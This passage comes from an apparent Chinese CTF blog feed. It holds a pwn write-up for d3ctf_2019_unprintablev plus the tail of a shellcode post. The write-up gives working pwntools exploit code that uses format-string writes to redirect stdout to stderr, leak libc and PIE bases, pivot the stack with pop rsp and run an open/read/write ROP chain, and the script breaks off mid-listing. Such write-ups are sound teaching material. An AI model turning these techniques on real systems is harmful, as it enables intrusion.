class="built_in">len</span>(shellcode)))</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012015874.png"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>沙箱逃逸</tag>
        <tag>orw</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF_d3ctf_2019_unprintablev</title>
    <url>/posts/7d36ed0c.html</url>
    <content><![CDATA[<p>通过这道题的学习与收获有：</p>
<p>1、close 关闭了标准输出时，可以用格式化字符串漏洞来将stdout指向的内容修改成IO_2_1_stderr，让程序重新有回显，关于这个过程我画了张图方便自己理解。</p>
<p><img src="/../img/2706180-20220429212145573-1531060697.png"></p>
<p>2、已经拿到libc基地址的时候，我们所需要的gadget就可以直接去libc中拿，libc里啥都有，libc里啥都有，libc里啥都有，重要的事情说三遍！</p>
<p>3、写爆破脚本时，感觉会报错的地方，用try和except预判一手，让程序得以继续重新运行，而不是原地崩溃。</p>
<p>4、如果close(1)关闭了标准输出，那么格式化字符串漏洞的写入数据最多只能写入0x2000字节，程序如果执行了setvbuf，stdout会出现在bss段，反之则会在libc库中。</p>
<span id="more"></span>

<h1 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h1><p><img src="/../img/2706180-20220429212201826-1274587087.png"></p>
<p><img src="/../img/2706180-20220429212210885-1992629980.png"></p>
<h1 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h1><p><img src="/../img/2706180-20220429212233284-421994592.png"></p>
<p><img src="/../img/2706180-20220429212243902-940490318.png"></p>
<p>程序分析起来完全没压力，就是开了个沙箱，然后关闭了标准输出，然后循环100次格式化字符串漏洞（如果输入d^3CTF则会直接退出程序），数据是输入到了bss段。另外就是保护开了PIE</p>
<p>这道题可以说是de1ctf_2019_unprintable这道的强化版（因为某些方面这道题更简单），如果你现在在做本题并且没有做过unprintable这道题的话，建议先去做<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>这道题。</p>
<p>其实要说强化也不至于，这俩的区别就是一个是GetShell，一个是orw。前面的手法还是差不多的，ok，下面来分析一下这道题	</p>
<h1 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h1><p>首先这道题可以利用一百次的格式化字符串漏洞，这个相比于de1ctf_2019_unprintable的话是简单很多的。因为开了沙箱，那就考虑orw。有了unprintable这道题的经验，就很容易想到这道个题的思路也是将rop链布置到bss，然后将栈迁移到bss段即可。</p>
<p>然后就是最不好想的点，close(1)怎么处理？如果我们可以获取shell的话，可以将文件描述符重定位一下，用socket+connect也可以对抗close(1)（具体参考<a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">这篇文章</a>)）但是对于这道题而言都行不通，如果不能搞定这个close(1)，libc基地址和程序地址都无法泄露，那啥都没有还做个锤子…</p>
<p>在此学习到了一种新的手法来处理close(1)</p>
<blockquote>
<p>程序中的stdout（它是个指针）只是相当于一个跳板的作用（目的是去libc中寻IO_2_1_stdout地址），而IO_2_1_stdout所使用文件描述符1，close(1)关闭的是文件描述符1，但是程序中想要进行输出，并不是去直接跟文件描述符相接触，而是通过stdout来去访问到文件描述符(事实上它访问的是IO_2_1_stdout这个结构，而这个结构使用了文件描述符），举个例子，即使文件描述符1被关闭，但是<strong>执行puts的时候，程序是不知道文件描述符被关闭了，因此它依然会通过stdout来去寻找IO_2_1_stdout</strong>（以获取文件描述符1），<strong>等找到IO_2_1_stdout，程序才意识到文件描述符1被关闭，因此并不会让puts出现任何回显</strong>。</p>
<p>但是如果我们可以在这个过程的中间做手脚比如将原本stdout所指向的IO_2_1_stdout修改为IO_2_1_stderr，等程序来寻找的时候，最终获取了文件描述符2，由于文件描述符2对应的终端也是屏幕，最终执行puts成功出现了回显。</p>
</blockquote>
<p>PS:<strong>程序如果执行setvbuf，stdout会出现在bss段，反之则会在libc库中</strong>。</p>
<p>因此当前思路就是利用格式化字符串将stdout所指向的IO_2_1_stdout修改为IO_2_1_stderr，让程序出现回显。（另外就是一个大坑，<strong>如果close(1)关闭了标准输出，那么格式化字符串漏洞的写入数据最多只能写入0x2000字节</strong>（本菜狗通过实验仅仅只发现了这个规律，目前还不知道原因，如果各位师傅知道原因的话，还请告知）</p>
<h2 id="重启输出"><a href="#重启输出" class="headerlink" title="重启输出"></a>重启输出</h2><p>由于输入是在bss段上，要是想修改栈中的数据，就要去布置一条栈链（关于栈链本文不再多说，具体可以去看<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>这篇文章）</p>
<p>然后通过栈链来修改数据。</p>
<h3 id="布置栈链"><a href="#布置栈链" class="headerlink" title="布置栈链"></a>布置栈链</h3><p><img src="/../img/2706180-20220429212323223-1540543285.png"></p>
<p>首先发现栈中存在bss段上buf的地址<font color=red>（<strong>请注意区分buf的地址，和指向buf的地址）</strong></font>，因此我们要把0x7fffffffdf58布置到栈里面，通过0x7fffffffdf58来改写0x555555756060,将其改写为stdout的地址，然后通过stdout的地址来修改libc中IO_2_1_stdout。</p>
<p>发现这里有一条栈链（如下图），那么我们拿它来开刀</p>
<p><img src="/../img/2706180-20220429211303720-552527412.png" alt="image-20220429120543301"></p>
<p>这个偏移是6，因此第一次输入payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>leak为程序自己泄露的地址取最后一字节，通过调试发现程序自己泄露的地址就是<strong>指向buf的地址</strong>，而我们现在就是要利用栈链把<strong>指向buf的地址</strong>写到栈里。</p>
<p>下图为修改前：</p>
<p><img src="/../img/2706180-20220429211303321-1767973157.png" alt="image-20220429120948542"></p>
<p>下图为修改后：</p>
<p><img src="/../img/2706180-20220429211302412-550468177.png" alt="image-20220429121046146"></p>
<p>下一步，通过指向buf的地址来修改buf地址，将其修改为stdout的值，也就是通过下图来进行修改</p>
<p><img src="/../img/2706180-20220429211301712-926818635.png" alt="image-20220429131219657"></p>
<p>由图可知，偏移取10（考虑六个寄存器），payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>修改前：</p>
<p><img src="/../img/2706180-20220429212347424-250445275.png"></p>
<p>修改后：</p>
<p><img src="/../img/2706180-20220429211301359-1998268975.png" alt="image-20220429131503421"></p>
<p>此时buf已经被修改成了stdout的值，可以看到stdout指向了IO_2_1_stdout。</p>
<h3 id="修改IO-2-1-stdout"><a href="#修改IO-2-1-stdout" class="headerlink" title="修改IO_2_1_stdout"></a>修改IO_2_1_stdout</h3><p>最后通过stdout将IO_2_1_stdout改为IO_2_1_stderr即可。</p>
<p>IO_2_1_stderr的偏移去libc中找（如下图），由于最后偏移只是最后一个半字节不同，但是利用格式化字符串要么修改一字节要么修改两字节，因此这里我们采用修改后两字节，即爆破倒数第四位（我们采用hn写入，但是对偏移取&amp;0xfff，因此我们一直在爆破成功的条件就是libc基地址倒数第四位为0时）</p>
<p><img src="/../img/2706180-20220429211300471-55201055.png" alt="image-20220429132536061"></p>
<p>这里的payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure>

<p>stderr为IO_2_1_stderr地址最后三位</p>
<p>由于这里是需要爆破的，如果爆破不成功就意味着修改失败，则程序依然不会给回显，因此我们通过程序是否有回显来判断,如果有回显的话，我们发过去的aaaaa肯定是可以被接收的，否则则返回当前函数，继续爆破。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>下面为爆破成功修改stdout的情况，可以看到此时的stdout已经指向了IO_2_1_stderr</p>
<p><img src="/../img/2706180-20220429211259662-1580436394.png" alt="image-20220429135139870"></p>
<p>至此我们的输出已经被重启，那剩下的就随便玩了。</p>
<h2 id="泄露数据"><a href="#泄露数据" class="headerlink" title="泄露数据"></a>泄露数据</h2><p>由于接下来要对抗PIE以及要获取libc，因此我们要先泄露一下栈中数据。我们要获取栈基地址，libc基地址，程序基地址，观察栈里情况（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012025053.png" alt="image-20230701202507773"></p>
<p>如果此时直接发送payload会发现后门的数据都连包了，如果每次sendline之前都打上pause()，那么在格式化字符串执行的时候要你把所有的sendline全发了才能去执行，如果全发的话会连包… （这里补充一个很细的技巧，每次发送数据时，把payload给填满，这样就可以避免连包的产生），payload如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h2><p>因为最后的核心是在bss段布置rop链，因此我们需要把栈给迁移到bss段。大致思路是将返回地址改写成pop rsp地址，而把返回地址下面的内容改成要迁移的bss段地址，最后执行pop rsp的时候就完成了迁移，最终执行我们布置在bss段上rop链。</p>
<p>先说修改返回地址。</p>
<p><img src="/../img/2706180-20220429211258718-1324186526.png" alt="image-20220429145805076"></p>
<p>只需要拿pop rsp的地址加上程序基地址的偏移，然后取后两字节就ok了。不过通过观察当前栈发现，依旧是需要栈链来修改返回地址，因为没有栈的内容指向了返回地址（如下图）</p>
<p><img src="/../img/2706180-20220429211258315-666625238.png" alt="image-20220429200013595"></p>
<p>将栈顶内存单元指向的0x7ffe8cfa5578改成0x7ffe8cfa5588（如下图），这步的目的是通过0x7ffe8cfa5588来修改menu的返回地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012025335.png" alt="image-20230701202555030"></p>
<p>然后将menu函数的返回地址修改成pop rsp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>下图为修改后：</p>
<p><img src="/../img/2706180-20220429211254572-26405026.png" alt="image-20220429201250680"></p>
<p>此时返回地址已经修改完成，最后两步分别是布置迁移地址和构造rop链，先说布置迁移地址。</p>
<h2 id="布置迁移地址"><a href="#布置迁移地址" class="headerlink" title="布置迁移地址"></a>布置迁移地址</h2><p>这个过程和<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>一模一样（原理在这篇文章中已经解释），就不再解释原理了，直接放这部分脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 布置迁移地址bss_addr+0x10  因为bss要存放d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h2><p>首先要触发pop rsp，肯定是要结束循环，因此我们输入的payload最开始要存放字符串d^3CTF，同时我们要采用orw，open的flag字符串也要存入。所以d^3CTF后面再写个flag字符串。又因为最开始的pop rsp后面还有pop r13;pop r14;pop r15，因此在字符串后面填入24字节的垃圾数据（为了避免将字符串弹入寄存器，我们迁移的地址垫高0x10字节）</p>
<p>至此开始正式布置rop链，这里说一下，我最开始用的是mprotect函数改写bss段属性，最后本地获取了flag，但是远程没有显示flag（但是脚本写的是没问题的，远程不通是个未解之谜…这个脚本我放到文末了）</p>
<p>mprotect行不通，那就采用传统方式，传参然后执行函数。</p>
<p>我们接下来就是要执行下面的内容，值得一提的是由于close关闭了文件描述符1，因此open返回的文件描述符是1（文件描述符是取当前可用文件描述符的最小的那一个，此时0,2被占用，因此1是最小），同时由于stdout指向了IO_2_1_stderr,所以我们应该使用文件描述符2进行输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">1</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br><span class="line">write(<span class="number">2</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>至于传参之类所需要的gadget，用啥就去libc库里找（因为现在libc基地址是知道的），libc里啥都有。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">   payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">   payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(write_addr)</span><br><span class="line">   p.sendline(payload)</span><br><span class="line">   p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><h2 id="1、获取libc基地址，用libc库里的gadget执行orw获取flag"><a href="#1、获取libc基地址，用libc库里的gadget执行orw获取flag" class="headerlink" title="1、获取libc基地址，用libc库里的gadget执行orw获取flag"></a>1、获取libc基地址，用libc库里的gadget执行orw获取flag</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;构造栈链，第一次构造一个指向buf的栈地址&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第二次通过指向buf的栈地址，将buf修改为stdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第三次通过stdout将_IO_2_1_stdout_改成_IO_2_1_stderr_值，此时需要爆破倒数第二字节的前半字节，猜测为0，概率1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;下面来判断是否将stdout指向的值改写成stderr指向的值&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将menu函数的返回地址修改成pop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入bss段指针</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 布置迁移地址bss_addr+0x10  因为bss要存放d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span 